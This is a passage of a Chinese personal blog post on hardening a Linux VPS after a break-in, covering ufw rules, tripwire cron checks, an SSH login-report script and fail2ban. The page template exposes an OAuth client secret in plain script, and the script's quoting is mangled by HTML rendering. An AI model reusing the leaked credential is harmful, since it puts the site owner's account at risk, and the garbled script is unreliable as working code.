+<p>&#x9632;&#x706B;&#x5899;&#x7684;&#x4F5C;&#x7528;&#x4E3B;&#x8981;&#x662F;&#x5BF9;&#x5916;&#x5173;&#x95ED;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#xFF0C;&#x51CF;&#x5C11;&#x7531;&#x5E38;&#x89C4;&#x7A0B;&#x5E8F;&#x672C;&#x8EAB;&#x7684;&#x6F0F;&#x6D1E;&#x800C;&#x5E26;&#x6765;&#x7684;&#x9690;&#x60A3;&#x3002;&#x540C;&#x6837;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x597D;&#x7528;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x201C;ufw&#x201D;&#xFF0C;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x7684;&#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#xFF1A;</p>
+<h1 id="ufw-allow-80-tcp"><a href="#ufw-allow-80-tcp" class="headerlink" title="ufw allow 80/tcp"></a>ufw allow 80/tcp</h1><h1 id="ufw-allow-ssh"><a href="#ufw-allow-ssh" class="headerlink" title="ufw allow ssh"></a>ufw allow ssh</h1><p>&#x53EA;&#x5F00;&#x542F;&#x4E24;&#x4E2A;&#x670D;&#x52A1;&#xFF0C;web service&#x548C;ssh service&#x3002;</p>
+<p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5EFA;&#x8BAE;</p>
+<p>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x653B;&#x51FB;&#x6211;&#x670D;&#x7684;&#x65B9;&#x5F0F;&#x592A;&#x591A;&#x4E86;&#xFF0C;&#x66B4;&#x529B;&#x7834;&#x89E3;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x53EA;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x79CD;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x662F;&#x5229;&#x7528;&#x8F6F;&#x4EF6;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x7684;&#xFF0C;&#x8FD8;&#x8BB0;&#x5F97;&#x4E0A;&#x4E00;&#x5E74;&#x4E00;&#x8FDE;&#x4E32;&#x4EE4;&#x4EBA;&#x53D1;&#x6307;&#x7684;&#x6F0F;&#x6D1E;&#x5417;&#xFF1A;HeartBleed, Shellshock&#xFF01;&#xFF01;&#x4E3A;&#x4E86;&#x7262;&#x8BB0;&#x8FD9;&#x4E9B;&#x60E8;&#x75DB;&#x7684;&#x6559;&#x8BAD;&#xFF08;&#x522B;&#x4EBA;&#x8EAB;&#x4E0A;&#x7684;&#xFF09;&#xFF0C;&#x8C28;&#x8BB0;&#xFF1A;</p>
+<ul>
+<li><strong>&#x5173;&#x6CE8;&#x5B89;&#x5168;&#x52A8;&#x6001;&#xFF0C;&#x5373;&#x65F6;&#x66F4;&#x65B0;&#x8F6F;&#x4EF6;&#x5B89;&#x5168;&#x8865;&#x4E01;&#xFF01;</strong></li>
+<li><strong>&#x9650;&#x5236;&#x670D;&#x52A1;&#xFF0C;&#x53EA;&#x8BA9;&#x8BE5;&#x8FD0;&#x884C;&#x7684;&#x670D;&#x52A1;&#x8FD0;&#x884C;&#xFF01;</strong></li>
+<li><strong>&#x5728;&#x5B89;&#x88C5;&#x975E;&#x5B98;&#x65B9;&#x5305;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x63D0;&#x9AD8;&#x8B66;&#x60D5;&#xFF0C;&#x5C0F;&#x5FC3;&#x88AB;&#x6389;&#x5305;!</strong><br>&#x5168;&#x57CE;&#x8B66;&#x6212;<br>&#x5EFA;&#x597D;&#x57CE;&#x5899;&#xFF0C;&#x5C31;&#x8BE5;&#x90E8;&#x7F72;&#x54E8;&#x5175;&#x4E86;&#x3002;</li>
+</ul>
+<p>&#x90A3;&#x4E48;&#x8BE5;&#x5982;&#x4F55;&#x76D1;&#x6D4B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5065;&#x5EB7;&#x72B6;&#x6001;&#x5462;&#xFF1F;</p>
+<p>&#x5728;linux&#x4E0B;&#x8FD8;&#x662F;&#x6709;&#x4E00;&#x4E9B;&#x5DE5;&#x5177;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E00;&#x756A;&#x5BF9;&#x6BD4;&#xFF0C;&#x6211;&#x6700;&#x7EC8;&#x9009;&#x62E9;&#x4E86;tripwire&#x3002;&#x5979;&#x53EF;&#x4EE5;&#x68C0;&#x6D4B;linux&#x5173;&#x952E;&#x6587;&#x4EF6;&#x7684;&#x53D8;&#x5316;&#x60C5;&#x51B5;,&#x6BD4;&#x5982;/usr/bin&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x914D;&#x7F6E;&#x4E86;&#x4E00;&#x4E2A;crontab&#xFF0C;&#x6BCF;&#x5929;&#x65E9;&#x4E0A;3&#x70B9;&#x68C0;&#x67E5;&#x4E00;&#x904D;&#x7CFB;&#x7EDF;&#x5173;&#x952E;&#x6587;&#x4EF6;&#xFF0C;&#x770B;&#x770B;&#x662F;&#x5426;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x4E14;&#x90AE;&#x4EF6;&#x62A5;&#x544A;&#x7ED9;&#x6211;&#x3002;</p>
+<p>&#x90AE;&#x4EF6;crontab&#x914D;&#x7F6E;&#xFF1A;</p>
+<p>30 14 <em> </em> * /usr/sbin/tripwire &#x2013;check | mail -s &#x201C;Tripwire report for <code>uname -n</code>&#x201C; <a href="mailto:monklof@gmail.com" target="_blank" rel="noopener">monklof@gmail.com</a> -r report.tripwire<br>&#x8FD9;&#x6837;&#xFF0C;&#x6BCF;&#x5929;&#x6211;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x88AB;&#x7834;&#x574F;&#x4E86;&#x3002;</p>
+<p>&#x6C72;&#x53D6;&#x8FD9;&#x6B21;&#x6559;&#x8BAD;&#xFF0C;&#x4E3A;&#x4E86;&#x80FD;&#x6BCF;&#x5929;&#x68C0;&#x6D4B;&#x7528;&#x6237;&#x767B;&#x5F55;&#x548C;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x7279;&#x610F;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x6765;&#x68C0;&#x67E5;&#x6628;&#x5929;&#x7CFB;&#x7EDF;&#x7684;&#x767B;&#x5F55;&#x60C5;&#x51B5;&#xFF1A;</p>
+<p>login_review.sh:</p>
+<p>#! /usr/bin/env bash</p>
+<h1 id="monitor-yesterday&#x2019;s-login-via-ssh-and-send-report-email"><a href="#monitor-yesterday&#x2019;s-login-via-ssh-and-send-report-email" class="headerlink" title="monitor yesterday&#x2019;s login via ssh, and send report email"></a>monitor yesterday&#x2019;s login via ssh, and send report email</h1><p>date=<code>date -d &quot;yesterday&quot; +&quot;%b %e&quot;</code><br>yesterday_acceptedlog=<code>grep &quot;${date}.*sshd.*Accepted&quot; /var/log/auth.log | grep -v &quot;sudo&quot;</code><br>fail=<code>grep &quot;${date}.*sshd.*Failed&quot; /var/log/auth.log | grep -v &quot;sudo&quot; | wc -l</code></p>
+<p>success=<code>printf &quot;%s&quot; &quot;$yesterday_acceptedlog&quot; |wc -l</code></p>
+<p>warn=&#x201D;&#x201D;<br>if [ $success -gt 0 ]<br>then<br>warn=&#x201D;[WARN] &#x201C;<br>fi</p>
+<p>html=&#x201D;&lt;!doctype html&gt;</p>
+<p><html><br>  <head><title>${warn}SSH Login Reports for <code>uname -n</code> at $date </title></head><br>  <body><br>    <div class="\" result\""=""><br>     <strong>Success logins:</strong> $success <br><br>     <table border="\" 1\""="" style="\" border-collapse:"="" collapse;\"=""><br>       <tr><br>         <th>Time</th><br>         <th>User</th><br>         <th>Login Method</th><br>       </tr><br><code>echo $yesterday_acceptedlog | awk &apos;{if(length !=0)printf \&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s (%s:%s)&lt;/td&gt;&lt;/tr&gt;\n\&quot;,$3,$9,$7,$11,$13}&apos;</code><br>     </table></div></body></html></p>
+<pre><code> &lt;strong&gt;Failed Trys: &lt;/strong&gt; $fail &lt;br /&gt;
+&lt;/div&gt;
+</code></pre><p>  <br>&#x201C;</p>
+<p>case $1 in<br>-d | &#x2013;debug)<br>    printf &#x201C;Success logs: %d\n%s\nRendered Html:\n%s&#x201D; $success &#x201C;$yesterday_acceptedlog&#x201D; &#x201C;$html&#x201D;<br>    ;;<br>*)<br>    echo $html | mail -s &#x201C;${warn}SSH Login Report for <code>uname -n</code> at $date&#x201D; <a href="mailto:monklof@gmail.com" target="_blank" rel="noopener">monklof@gmail.com</a> -r report.login_review -a &#x201C;Content-type: text/html&#x201D;<br>    ;;<br>esac<br>&#x7136;&#x540E;&#x4E5F;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;crontab&#xFF0C;&#x6BCF;&#x5929;&#x90FD;&#x68C0;&#x6D4B;:</p>
+<p>25 14 <em> </em> * /usr/local/bin/login_review.sh<br>&#x8FD9;&#x6837;&#xFF0C;&#x6211;&#x6BCF;&#x5929;&#x5C31;&#x80FD;&#x6536;&#x5230;&#x8FD9;&#x6837;&#x7684;&#x4E24;&#x4EFD;&#x62A5;&#x8868;&#x4E86;&#xFF1A;</p>
+<img src="/2018/03/30/&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;/4.png">
+<img src="/2018/03/30/&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;/5.png">
+<img src="/2018/03/30/&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;/6.png">
+<p>&#x256E;(&#x256F;&#x25BD;&#x2570;)&#x256D;</p>
+<p>&#x535A;&#x5BA2;&#x505C;&#x4E86;&#x5C06;&#x8FD1;&#x4E00;&#x4E2A;&#x661F;&#x671F;&#x4E4B;&#x540E;&#xFF0C;&#x505A;&#x597D;&#x4E86;&#x57FA;&#x672C;&#x7684;&#x9632;&#x62A4;&#xFF0C;&#x5C0F;&#x5FC3;&#x7FFC;&#x7FFC;&#x7684;&#x5C06;&#x670D;&#x52A1;&#x5668;&#x518D;&#x6B21;&#x5F00;&#x542F;&#x3002;&#xFF08;&#x4EE5;&#x4E0A;&#x7684;&#x5B89;&#x5168;&#x7B56;&#x7565;&#x7684;&#x5B9E;&#x65BD;&#x4E5F;&#x662F;&#x5728;&#x670D;&#x52A1;&#x5F00;&#x542F;&#x4E4B;&#x540E;&#x4E00;&#x76F4;&#x5728;&#x8FDB;&#x884C;&#x7684;&#xFF09;</p>
+<p>&#x670D;&#x52A1;&#x5668;&#x91CD;&#x65B0;&#x5F00;&#x542F;&#x7684;&#x90A3;&#x5929;&#xFF0C;&#x901A;&#x8FC7;DO&#x7684;&#x8FD0;&#x7EF4;&#x754C;&#x9762;&#x67E5;&#x770B;&#x88AB;&#x653B;&#x51FB;&#x7684;&#x90A3;&#x5929;&#x7684;&#x6D41;&#x91CF;&#x60C5;&#x51B5;&#xFF1A;</p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;29&#x53F7;&#x90A3;&#x5929;tcp syn flood&#x6D41;&#x91CF;&#x8FBE;&#x5230;&#x4E86;140Mbps&#xFF01;&#x5FC3;&#x6709;&#x4F59;&#x60B8;&#x554A;&#x5FC3;&#x6709;&#x4F59;&#x60B8;&#x3002;</p>
+<p>&#x7136;&#x540E;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x51E0;&#x5929;&#xFF0C;&#x6BCF;&#x5929;&#x90FD;&#x770B;fail2ban&#x67E5;&#x770B;&#x88AB;&#x5C01;&#x7981;&#x7684;ip&#x3001;&#x770B;&#x62A5;&#x8868;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x5065;&#x5EB7;&#x72B6;&#x51B5;&#x3002;&#x6548;&#x679C;&#x663E;&#x8457;&#xFF0C;&#x6BCF;&#x5929;&#x7684;&#x66B4;&#x7834;&#x5931;&#x8D25;&#x5C1D;&#x8BD5;&#x91CF;&#x4ECE;&#x4E0A;&#x4E07;&#x6210;&#x529F;&#x964D;&#x4F4E;&#x5230;500&#x4EE5;&#x5185;&#x3002;&#x5E76;&#x4E14;&#x81F3;&#x4ECA;&#x672A;&#x51FA;&#x73B0;&#x8FC7;&#x95EE;&#x9898;&#x3002;</p>
+<p>Cheers&#xFF01;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x7684;&#x8868;&#x60C5;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p>
+<img src="/2018/03/30/&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;/7.jpg">
+      
+    </div>
+    <footer class="article-footer">
+      
+
+      
+        
+	  <!-- Gitment START! Deploy by Z4HD -->
+	<div id="comments"></div>
+		<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+		<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+		<script>
+		var gitment = new Gitment({
+			id: 'http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/',
+			owner: 'JoeJoeyMa',
+ 			repo: 'JoeJoeyMa.github.io',
+			oauth: {
+				client_id: 'b16fd2b48371378f485f',
+				client_secret: 'a3d12c33716206b031ba0d95fade9927e31dbb46',
+			},
+		})
+		gitment.render('comments')
+		</script>
+		<!-- Gitment 自定义样式表 -->
+		<link rel="stylesheet" href="/css/comment-gitment.css">
+		<!-- Gitment END! -->
+	 
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VPS/">VPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/firewalld/">firewalld</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/爆破端口/">爆破端口</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/脚本小子/">脚本小子</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/运营/">运营</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/04/24/快速破解各种散列hash [ hashcat入门篇 ]/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Nuevo</strong>
+      <div class="article-nav-title">
+        
+          快速破解各种散列hash [ hashcat入门篇 ]
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/03/09/ES6来完成NodeJs/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Viejo</strong>
+      <div class="article-nav-title">ES6来完成NodeJs</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Inhalt</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#grep-“Accepted”-var-log-auth-log-1"><span class="nav-number">1.</span> <span class="nav-text">grep “Accepted” /var/log/auth.log.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#grep-“Jan-2-5-8-sshd-Failed”-var-log-auth-log-1-wc"><span class="nav-number">2.</span> <span class="nav-text">grep “Jan 2[5-8] .sshd.Failed” /var/log/auth.log.1 | wc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#history"><span class="nav-number">3.</span> <span class="nav-text">history</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cat-etc-init-d-apache2-sh"><span class="nav-number">4.</span> <span class="nav-text">cat /etc/init.d/apache2.sh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kill-13648-杀掉apache2-sh"><span class="nav-number">5.</span> <span class="nav-text">kill 13648  # 杀掉apache2.sh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kill-14519-杀掉”icnanker”"><span class="nav-number">6.</span> <span class="nav-text">kill 14519  # 杀掉”icnanker”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kill-26595-杀掉-sshd"><span class="nav-number">7.</span> <span class="nav-text">kill 26595  # 杀掉.sshd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#history-1"><span class="nav-number">8.</span> <span class="nav-text">history</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cat-etc-init-d-apache2-sh-1"><span class="nav-number">9.</span> <span class="nav-text">cat /etc/init.d/apache2.sh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rm-usr-bin-icnanker"><span class="nav-number">10.</span> <span class="nav-text">rm /usr/bin/icnanker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lockr-i-usr-bin-chattr"><span class="nav-number">11.</span> <span class="nav-text">lockr -i /usr/bin/chattr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#chmod-755-usr-bin-chattr"><span class="nav-number">12.</span> <span class="nav-text">chmod 755 /usr/bin/chattr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#chattr-i-usr-bin-icnanker"><span class="nav-number">13.</span> <span class="nav-text">chattr -i /usr/bin/icnanker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rm-usr-bin-icnanker-1"><span class="nav-number">14.</span> <span class="nav-text">rm /usr/bin/icnanker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ufw-allow-80-tcp"><span class="nav-number">15.</span> <span class="nav-text">ufw allow 80/tcp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ufw-allow-ssh"><span class="nav-number">16.</span> <span class="nav-text">ufw allow ssh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#monitor-yesterday’s-login-via-ssh-and-send-report-email"><span class="nav-number">17.</span> <span class="nav-text">monitor yesterday’s login via ssh, and send report email</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Construido por <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/JoeJoeyMa/JoeJoeyMa.github.io" target="_blank">Hexo-theme-Joejoey</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2020 To change is to be better to change often is to change perfect All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">About themes</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+    <a href="/book" class="mobile-nav-link">📓</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-114383200-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            To change is to be better to change often is to change perfect
+          </div>
+          <div class="panel-body">
+            Copyright © 2020 To change is to be better to change often is to change perfect All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
